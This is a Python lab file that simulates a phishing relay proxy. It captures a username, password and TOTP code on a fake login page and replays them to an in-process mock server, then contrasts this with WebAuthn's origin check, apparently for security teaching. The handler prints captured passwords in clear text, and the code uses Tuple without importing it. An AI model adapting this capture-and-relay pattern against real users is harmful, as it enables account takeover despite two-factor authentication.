"""
MITM (Man-in-the-Middle) Relay Proxy for Person B - Lab 3
Educational demonstration of relay attacks against authentication

MITM Relay Attack:
- Attacker intercepts communication between user and server
- Captures credentials (username, password, OTP)
- Forwards to real server in real-time
- Gains access even with 2FA

Vulnerability:
- Traditional OTP (TOTP/HOTP): Can be relayed successfully
- User enters credentials on attacker's site
- Attacker forwards to real site within time window
- Works because OTP is just a numeric code

Protection:
- WebAuthn/FIDO2: Cannot be relayed
- Cryptographic signature bound to origin
- Server verifies origin matches expected domain
- Relay attack fails due to origin mismatch

WARNING: For educational purposes only!
Only run on localhost for demonstration.
Never use for malicious purposes.

Author: Person B
Purpose: Demonstrate MITM attack and WebAuthn protection
"""

import socket
import threading
import time
import json
import hashlib
from datetime import datetime
from typing import Dict, List, Optional
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse
import pyotp


class RelayStats:
    """
    Statistics tracker for MITM relay attacks
    Records successful/failed relay attempts and timing data
    """

    def __init__(self):
        self.stats = {
            'total_attempts': 0,
            'successful_relays': 0,
            'failed_relays': 0,
            'otp_captures': [],
            'webauthn_attempts': [],
            'timing_data': []
        }

    def log_otp_capture(self, username: str, password: str, otp: str,
                        relay_success: bool, relay_latency: float):
        """
        Log OTP capture and relay attempt

        Args:
            username: Captured username
            password: Captured password
            otp: Captured OTP code
            relay_success: Whether relay to real server succeeded
            relay_latency: Time taken to relay (seconds)
        """
        self.stats['total_attempts'] += 1

        if relay_success:
            self.stats['successful_relays'] += 1
        else:
            self.stats['failed_relays'] += 1

        self.stats['otp_captures'].append({
            'timestamp': datetime.now().isoformat(),
            'username': username,
            'password': '***' + password[-4:] if len(password) > 4 else '***',
            'otp': otp,
            'relay_success': relay_success,
            'relay_latency': relay_latency
        })

        self.stats['timing_data'].append(relay_latency)

    def log_webauthn_attempt(self, username: str, credential_data: Dict,
                             relay_success: bool, failure_reason: str):
        """
        Log WebAuthn relay attempt (should always fail)

        Args:
            username: Username attempting WebAuthn
            credential_data: WebAuthn credential data
            relay_success: Whether relay succeeded (should be False)
            failure_reason: Why relay failed
        """
        self.stats['total_attempts'] += 1

        if relay_success:
            self.stats['successful_relays'] += 1
        else:
            self.stats['failed_relays'] += 1

        self.stats['webauthn_attempts'].append({
            'timestamp': datetime.now().isoformat(),
            'username': username,
            'relay_success': relay_success,
            'failure_reason': failure_reason,
            'has_credential': bool(credential_data)
        })

    def print_stats(self):
        """Print formatted statistics"""
        print("\n" + "="*70)
        print("MITM RELAY ATTACK STATISTICS")
        print("="*70)

        print(f"\nTotal Attempts: {self.stats['total_attempts']}")
        print(f"Successful Relays: {self.stats['successful_relays']}")
        print(f"Failed Relays: {self.stats['failed_relays']}")

        if self.stats['total_attempts'] > 0:
            success_rate = (self.stats['successful_relays'] / self.stats['total_attempts']) * 100
            print(f"Success Rate: {success_rate:.2f}%")

        print(f"\n--- OTP Captures ---")
        print(f"Total OTP captures: {len(self.stats['otp_captures'])}")

        for i, capture in enumerate(self.stats['otp_captures'][-5:], 1):  # Last 5
            print(f"\n  Capture {i}:")
            print(f"    Time: {capture['timestamp']}")
            print(f"    Username: {capture['username']}")
            print(f"    OTP: {capture['otp']}")
            print(f"    Relay Success: {'✓' if capture['relay_success'] else '✗'}")
            print(f"    Relay Latency: {capture['relay_latency']*1000:.2f} ms")

        print(f"\n--- WebAuthn Attempts ---")
        print(f"Total WebAuthn attempts: {len(self.stats['webauthn_attempts'])}")

        for i, attempt in enumerate(self.stats['webauthn_attempts'][-5:], 1):
            print(f"\n  Attempt {i}:")
            print(f"    Time: {attempt['timestamp']}")
            print(f"    Username: {attempt['username']}")
            print(f"    Relay Success: {'✓' if attempt['relay_success'] else '✗'}")
            print(f"    Failure Reason: {attempt['failure_reason']}")

        if self.stats['timing_data']:
            avg_latency = sum(self.stats['timing_data']) / len(self.stats['timing_data'])
            print(f"\n--- Timing Analysis ---")
            print(f"Average relay latency: {avg_latency*1000:.2f} ms")
            print(f"Min latency: {min(self.stats['timing_data'])*1000:.2f} ms")
            print(f"Max latency: {max(self.stats['timing_data'])*1000:.2f} ms")

        print("="*70 + "\n")

    def save_to_file(self, filename: str = "mitm_relay_stats.json"):
        """Save statistics to JSON file"""
        with open(filename, 'w') as f:
            json.dump(self.stats, f, indent=2)
        print(f"[MITM] Statistics saved to {filename}")


class FakeAuthServer:
    """
    Simulates a legitimate authentication server
    Used as the "real" server that attacker relays to
    """

    def __init__(self):
        # Simulated user database
        self.users = {
            'alice': {
                'password_hash': hashlib.sha256('password123'.encode()).hexdigest(),
                'totp_secret': pyotp.random_base32()
            },
            'bob': {
                'password_hash': hashlib.sha256('secret456'.encode()).hexdigest(),
                'totp_secret': pyotp.random_base32()
            }
        }

        print("[FakeServer] Initialized with test users")
        for username, data in self.users.items():
            totp = pyotp.TOTP(data['totp_secret'])
            print(f"  {username}: Current OTP = {totp.now()}")

    def verify_credentials(self, username: str, password: str, otp: str) -> bool:
        """
        Verify username, password, and OTP

        Args:
            username: Username to verify
            password: Password to verify
            otp: OTP code to verify

        Returns:
            True if all credentials are valid
        """
        # Check if user exists
        if username not in self.users:
            return False

        user_data = self.users[username]

        # Verify password
        password_hash = hashlib.sha256(password.encode()).hexdigest()
        if password_hash != user_data['password_hash']:
            return False

        # Verify TOTP
        totp = pyotp.TOTP(user_data['totp_secret'])
        if not totp.verify(otp, valid_window=1):
            return False

        return True

    def verify_webauthn(self, username: str, credential_data: Dict, origin: str) -> Tuple[bool, str]:
        """
        Verify WebAuthn credentials (with origin checking)

        This is the KEY security feature that prevents relay attacks

        Args:
            username: Username attempting authentication
            credential_data: WebAuthn credential data
            origin: Origin domain from clientDataJSON

        Returns:
            Tuple of (success: bool, reason: str)
        """
        # Check if user exists
        if username not in self.users:
            return False, "User not found"

        # CRITICAL: Check origin matches expected RP ID
        expected_origin = "http://localhost:8000"  # Real server's origin

        if origin != expected_origin:
            return False, f"Origin mismatch: got {origin}, expected {expected_origin}"

        # In real implementation, would also verify:
        # - Signature using stored public key
        # - Challenge matches
        # - Authenticator data

        return True, "Authentication successful"


class MITMProxyHandler(BaseHTTPRequestHandler):
    """
    HTTP request handler for MITM proxy
    Intercepts requests from victim, relays to real server
    """

    # Class variables to share state
    stats = RelayStats()
    real_server = FakeAuthServer()
    fake_origin = "http://evil-phishing-site.com:9999"  # Attacker's site
    real_origin = "http://localhost:8000"  # Victim's real site

    def log_message(self, format, *args):
        """Custom logging"""
        pass  # Suppress default logging

    def do_GET(self):
        """Handle GET requests - serve phishing page"""
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            # Serve phishing page that looks like real login
            html = self.get_phishing_page()
            self.wfile.write(html.encode())

        elif self.path == '/stats':
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()

            # Return statistics
            stats_text = json.dumps(self.stats.stats, indent=2)
            self.wfile.write(stats_text.encode())

        else:
            self.send_error(404)

    def do_POST(self):
        """Handle POST requests - intercept credentials"""
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')
        params = parse_qs(post_data)

        if self.path == '/login_otp':
            self.handle_otp_login(params)
        elif self.path == '/login_webauthn':
            self.handle_webauthn_login(params)
        else:
            self.send_error(404)

    def handle_otp_login(self, params: Dict):
        """
        Handle OTP login attempt - VULNERABLE TO RELAY

        This demonstrates how OTP can be captured and relayed
        """
        username = params.get('username', [''])[0]
        password = params.get('password', [''])[0]
        otp = params.get('otp', [''])[0]

        print(f"\n[MITM] ⚠ CAPTURED CREDENTIALS:")
        print(f"[MITM] Username: {username}")
        print(f"[MITM] Password: {'*' * len(password)} ({password})")
        print(f"[MITM] OTP: {otp}")

        # Relay to real server
        print(f"[MITM] → Relaying to real server...")
        start_time = time.time()

        # Simulate relay to real server
        relay_success = self.real_server.verify_credentials(username, password, otp)
        relay_latency = time.time() - start_time

        # Log the capture
        self.stats.log_otp_capture(username, password, otp, relay_success, relay_latency)

        if relay_success:
            print(f"[MITM] ✓ RELAY SUCCESSFUL!")
            print(f"[MITM] Attacker gained access to victim's account")
            print(f"[MITM] Relay latency: {relay_latency*1000:.2f} ms")

            # Send success response to victim (they think they logged in)
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            response = "<html><body><h1>Login Successful!</h1><p>Redirecting...</p></body></html>"
            self.wfile.write(response.encode())

        else:
            print(f"[MITM] ✗ Relay failed (credentials invalid or OTP expired)")

            self.send_response(401)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            response = "<html><body><h1>Login Failed</h1><p>Invalid credentials</p></body></html>"
            self.wfile.write(response.encode())

    def handle_webauthn_login(self, params: Dict):
        """
        Handle WebAuthn login attempt - PROTECTED FROM RELAY

        This demonstrates why WebAuthn cannot be relayed
        """
        username = params.get('username', [''])[0]
        credential_json = params.get('credential', ['{}'])[0]

        try:
            credential_data = json.loads(credential_json)
        except:
            credential_data = {}

        print(f"\n[MITM] ⚠ CAPTURED WEBAUTHN ATTEMPT:")
        print(f"[MITM] Username: {username}")
        print(f"[MITM] Credential ID: {credential_data.get('credentialId', 'N/A')[:32]}...")

        # Try to relay to real server
        print(f"[MITM] → Attempting to relay WebAuthn to real server...")

        # Extract origin from credential (this is where protection happens)
        # In real WebAuthn, clientDataJSON contains the origin
        captured_origin = self.fake_origin  # Attacker's site origin

        print(f"[MITM] Origin in credential: {captured_origin}")
        print(f"[MITM] Real server expects: {self.real_origin}")

        # Attempt relay
        relay_success, reason = self.real_server.verify_webauthn(
            username,
            credential_data,
            captured_origin
        )

        self.stats.log_webauthn_attempt(username, credential_data, relay_success, reason)

        if relay_success:
            print(f"[MITM] ✗ UNEXPECTED: Relay succeeded (should not happen!)")

            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            response = "<html><body><h1>Login Successful!</h1></body></html>"
            self.wfile.write(response.encode())

        else:
            print(f"[MITM] ✓ RELAY BLOCKED!")
            print(f"[MITM] Reason: {reason}")
            print(f"[MITM] WebAuthn origin binding prevented the attack")

            self.send_response(401)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            response = f"<html><body><h1>Authentication Failed</h1><p>{reason}</p></body></html>"
            self.wfile.write(response.encode())

    def get_phishing_page(self) -> str:
        """
        Generate phishing page HTML
        Looks like legitimate login but sends to attacker
        """
        return """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Secure Login - Lab3 Demo</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 500px;
            margin: 50px auto;
            padding: 20px;
            background-color: #f0f0f0;
        }
        .container {
            background-color: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #333;
            border-bottom: 2px solid #e74c3c;
            padding-bottom: 10px;
        }
        .warning {
            background-color: #fff3cd;
            border: 1px solid #ffc107;
            padding: 15px;
            border-radius: 4px;
            margin: 20px 0;
        }
        .form-group {
            margin: 15px 0;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 12px;
            background-color: #e74c3c;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 10px;
        }
        button:hover {
            background-color: #c0392b;
        }
        .info {
            background-color: #d1ecf1;
            border: 1px solid #bee5eb;
            padding: 15px;
            border-radius: 4px;
            margin: 20px 0;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🚨 MITM PHISHING DEMO 🚨</h1>

        <div class="warning">
            <strong>WARNING:</strong> This is a simulated phishing site for educational demonstration.
            You are visiting: <strong>evil-phishing-site.com</strong>
        </div>

        <div class="info">
            <strong>Demonstration Purpose:</strong><br>
            This page simulates an attacker's phishing site that captures and relays credentials.
            <br><br>
            <strong>Test Credentials:</strong><br>
            Username: alice<br>
            Password: password123<br>
            Check console for current OTP
        </div>

        <h2>Login with OTP (TOTP)</h2>
        <form method="POST" action="/login_otp">
            <div class="form-group">
                <label>Username:</label>
                <input type="text" name="username" value="alice" required>
            </div>
            <div class="form-group">
                <label>Password:</label>
                <input type="password" name="password" value="password123" required>
            </div>
            <div class="form-group">
                <label>OTP Code:</label>
                <input type="text" name="otp" placeholder="Enter 6-digit code" required>
            </div>
            <button type="submit">Login (Will be relayed!)</button>
        </form>

        <h2 style="margin-top: 40px;">Login with WebAuthn</h2>
        <form method="POST" action="/login_webauthn">
            <div class="form-group">
                <label>Username:</label>
                <input type="text" name="username" value="alice" required>
            </div>
            <input type="hidden" name="credential" value='{"credentialId":"abc123"}'>
            <button type="submit">Login with WebAuthn (Will fail!)</button>
        </form>

        <div class="info" style="margin-top: 30px;">
            <strong>Expected Results:</strong><br>
            ✗ OTP Login: Credentials captured and relayed successfully<br>
            ✓ WebAuthn Login: Relay blocked due to origin mismatch
        </div>
    </div>
</body>
</html>
"""


def run_mitm_proxy(port: int = 9999):
    """
    Run the MITM proxy server

    Args:
        port: Port to listen on (default 9999)
    """
    print("\n" + "="*70)
    print("MITM RELAY PROXY - EDUCATIONAL DEMONSTRATION")
    print("Person B - Lab 3 Implementation")
    print("="*70)

    print(f"\n[MITM] Starting proxy on port {port}...")
    print(f"[MITM] Simulating phishing site: http://evil-phishing-site.com:{port}")
    print(f"[MITM] Real site: http://localhost:8000")

    print("\n[MITM] Press Ctrl+C to stop and view statistics")

    server = HTTPServer(('localhost', port), MITMProxyHandler)

    print(f"\n[MITM] ✓ Proxy running!")
    print(f"[MITM] Visit: http://localhost:{port}")
    print(f"[MITM] Try logging in to see relay attack in action")
    print()

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n\n[MITM] Shutting down proxy...")
        server.shutdown()

        # Print final statistics
        MITMProxyHandler.stats.print_stats()
        MITMProxyHandler.stats.save_to_file()


def demo_mitm_comparison():
    """
    Demonstrate MITM attack comparison between OTP and WebAuthn
    without actually running the server
    """
    print("\n" + "="*70)
    print("MITM RELAY ATTACK COMPARISON")
    print("Person B - Lab 3 Implementation")
    print("="*70)

    print("\n" + "="*70)
    print("SCENARIO 1: MITM RELAY WITH TOTP/HOTP (VULNERABLE)")
    print("="*70)

    print("\nAttack Flow:")
    print("  1. Victim visits: http://evil-phishing-site.com")
    print("     (Looks exactly like real site)")
    print()
    print("  2. Victim enters credentials:")
    print("     - Username: alice")
    print("     - Password: password123")
    print("     - TOTP Code: 123456")
    print()
    print("  3. Attacker's server captures ALL credentials")
    print("     [MITM] Username: alice")
    print("     [MITM] Password: password123")
    print("     [MITM] OTP: 123456")
    print()
    print("  4. Attacker relays to real site: http://real-site.com")
    print("     POST /login { username: alice, password: ***, otp: 123456 }")
    print()
    print("  5. Real server validates:")
    print("     ✓ Username/password correct")
    print("     ✓ OTP valid (within 30-second window)")
    print()
    print("  6. ✗ ATTACK SUCCESSFUL!")
    print("     - Attacker gains access to victim's account")
    print("     - Victim sees 'login successful' (sent by attacker)")
    print("     - Victim doesn't know they've been phished")
    print()
    print("  Relay Latency: ~50-200ms (well within TOTP window)")

    print("\n" + "="*70)
    print("SCENARIO 2: MITM RELAY WITH WEBAUTHN (PROTECTED)")
    print("="*70)

    print("\nAttack Flow:")
    print("  1. Victim visits: http://evil-phishing-site.com")
    print("     (Looks exactly like real site)")
    print()
    print("  2. Victim attempts WebAuthn authentication")
    print("     - Username: alice")
    print("     - Touch security key / use fingerprint")
    print()
    print("  3. Browser creates WebAuthn assertion:")
    print("     {")
    print("       credentialId: 'abc123...',")
    print("       signature: 'xyz789...',")
    print("       clientDataJSON: {")
    print("         type: 'webauthn.get',")
    print("         challenge: 'server_challenge',")
    print("         origin: 'http://evil-phishing-site.com'  ← KEY POINT!")
    print("       }")
    print("     }")
    print()
    print("  4. Attacker captures WebAuthn data")
    print("     [MITM] Credential ID: abc123...")
    print("     [MITM] Signature: xyz789...")
    print("     [MITM] Origin: http://evil-phishing-site.com")
    print()
    print("  5. Attacker relays to real site: http://real-site.com")
    print()
    print("  6. Real server validates:")
    print("     ✓ Credential ID exists")
    print("     ✓ Signature cryptographically valid")
    print("     ✗ Origin mismatch!")
    print("        Got: http://evil-phishing-site.com")
    print("        Expected: http://real-site.com")
    print()
    print("  7. ✓ ATTACK BLOCKED!")
    print("     - Server rejects authentication")
    print("     - Origin binding prevents relay")
    print("     - Victim cannot log in on fake site")

    print("\n" + "="*70)
    print("KEY DIFFERENCES")
    print("="*70)

    comparisons = [
        ("Credential Type", "OTP: 6-digit number", "WebAuthn: Cryptographic signature"),
        ("Binding", "OTP: No binding to site", "WebAuthn: Bound to origin domain"),
        ("Portability", "OTP: Can be entered anywhere", "WebAuthn: Only works on registered origin"),
        ("Relay Attack", "OTP: ✗ Vulnerable", "WebAuthn: ✓ Protected"),
        ("Phishing", "OTP: ✗ User can be tricked", "WebAuthn: ✓ Browser enforces origin"),
        ("Time Window", "OTP: ~30 seconds to relay", "WebAuthn: N/A - relay blocked"),
    ]

    for feature, otp, webauthn in comparisons:
        print(f"\n{feature}:")
        print(f"  {otp}")
        print(f"  {webauthn}")

    print("\n" + "="*70)
    print("RECOMMENDATIONS")
    print("="*70)

    print("\n1. For Users:")
    print("   • Always check URL before entering credentials")
    print("   • Use WebAuthn when available (YubiKey, Touch ID, etc.)")
    print("   • Be suspicious of unexpected 2FA prompts")
    print("   • OTP is better than nothing, but not phishing-proof")

    print("\n2. For Developers:")
    print("   • Implement WebAuthn for phishing resistance")
    print("   • If using OTP, educate users about phishing")
    print("   • Consider: OTP + WebAuthn for maximum security")
    print("   • Monitor for unusual login patterns")

    print("\n3. Why WebAuthn Wins:")
    print("   • Origin binding: Cannot be used on wrong domain")
    print("   • Public key crypto: Server never sees secret")
    print("   • Browser-enforced: User cannot make mistakes")
    print("   • FIDO2 certified: Industry standard")

    print("\n" + "="*70 + "\n")


if __name__ == "__main__":
    import sys

    print("\nMITM Relay Proxy Demonstration")
    print("="*70)
    print("\nOptions:")
    print("  1. Run interactive proxy (visit in browser)")
    print("  2. Show comparison demo (text-based)")
    print()

    # For automated demo, show comparison
    # For interactive, run server
    if len(sys.argv) > 1 and sys.argv[1] == "server":
        run_mitm_proxy(port=9999)
    else:
        demo_mitm_comparison()

        print("\nTo run interactive proxy:")
        print("  python3 mitm_relay_proxy.py server")
        print("\nThen visit: http://localhost:9999")
        print()
